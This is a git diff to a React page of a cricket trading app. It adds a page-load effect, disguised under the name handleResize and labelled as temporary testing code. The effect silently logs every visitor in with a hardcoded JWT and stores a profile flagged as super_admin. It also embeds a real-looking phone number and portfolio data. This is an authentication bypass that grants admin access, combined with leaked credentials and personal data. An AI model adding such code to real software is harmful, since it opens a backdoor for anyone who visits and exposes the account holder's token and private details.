@@ -20,6 +20,8 @@ import {
   ResponsiveContainer,
 } from "recharts";
 import MatchesSection from "./matchSections";
+import { toast } from "sonner";
+import { setUserIntoGlobalStore } from "@/lib/helper";
 
 interface Match {
   matchDesc: string;
@@ -295,6 +297,22 @@ const CricketSchedulePage = () => {
       }
     };
     fetchData();
+  }, []);
+
+  // temporary effect for testing purpose
+  useEffect(() => {
+    const handleResize = () => {
+      const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2ODFiNjU3ZTc2NzIxMjM5NWQwNTQ4NGEiLCJpYXQiOjE3NTA2NjcxOTYsImV4cCI6MTc1MTI3MTk5Nn0.QWX67du0tEMQYA_c9g7HKsqbvKQAyQ_-T5TnCa3riEA"
+      document.cookie = `token=${token}; path=/; secure;`;
+      toast.success("Login successful! Welcome to Dashboard.");
+      setUserIntoGlobalStore(token)
+      localStorage.setItem("user-storage", `{"state":{"user":{"name":"Gaz","mobile":"+918534946840","isVerified":true,"password":"","isAdmin":true,"role":"super_admin","lastSeen":"2025-05-07T13:50:12.306Z","amount":0,"transactions":[],"portfolio":[{"matchId":"118838","playerId":"9582","playerName":"Aiden Markram","team":"Lucknow Super Giants","initialPrice":"35","transactions":[{"type":"buy","quantity":1,"price":35,"autoSold":false,"_id":"682b3aff8d5dbf42c066b91d","timestamp":"2025-05-19T14:06:55.960Z"}],"currentHoldings":1,"_id":"682b3aff8d5dbf42c066b91c"},{"matchId":"118838","playerId":"9406","playerName":"Nicholas Pooran","team":"Lucknow Super Giants","initialPrice":"35","transactions":[{"type":"buy","quantity":5,"price":35,"autoSold":false,"_id":"682b3b058d5dbf42c066ba24","timestamp":"2025-05-19T14:07:01.756Z"},{"type":"buy","quantity":7,"price":35,"autoSold":false,"_id":"682b3b188d5dbf42c066c771","timestamp":"2025-05-19T14:07:20.685Z"},{"type":"sell","quantity":7,"price":35,"timestamp":"2025-05-19T14:07:27.595Z","autoSold":false,"reason":"soldbyuser","_id":"682b3b1f8d5dbf42c066cdb3"}],"currentHoldings":5,"_id":"682b3b058d5dbf42c066ba23"}],"teamPortfolio":[{"matchId":"117782","teamId":"2","teamName":"Nepal Women","initialPrice":"50","transactions":[{"type":"buy","quantity":1,"price":29.5,"timestamp":"2025-05-19T10:01:20.183Z","autoSold":false,"_id":"682b0170eff90e5d5359f69e"},{"type":"buy","quantity":4,"price":50,"timestamp":"2025-05-19T10:02:14.398Z","autoSold":false,"_id":"682b01a6eff90e5d535a036a"},{"type":"sell","quantity":4,"price":50,"timestamp":"2025-05-19T10:09:19.582Z","autoSold":false,"reason":"soldbyuser","_id":"682b034feff90e5d535a8018"},{"type":"buy","quantity":4,"price":50,"timestamp":"2025-05-19T10:09:27.877Z","autoSold":false,"_id":"682b0357eff90e5d535a82f8"}],"currentHoldings":5,"_id":"682b0170eff90e5d5359f69d"},{"matchId":"118838","teamId":"1","teamName":"Lucknow Super Giants","initialPrice":"50","transactions":[{"type":"buy","quantity":4,"price":51.1,"timestamp":"2025-05-19T14:05:59.641Z","autoSold":false,"_id":"682b3ac78d5dbf42c066b130"}],"currentHoldings":4,"_id":"682b3ac78d5dbf42c066b12f"}],"profileImage":"https://res.cloudinary.com/erfanaalam/image/upload/v1748599080/user_profiles/avegkbidgdl61dxqlsdn.jpg"}},"version":0}`)
+    }
+    handleResize()
+
+    return () => {
+      localStorage.removeItem("user-storage");
+    };
   }, []);
 
   return (
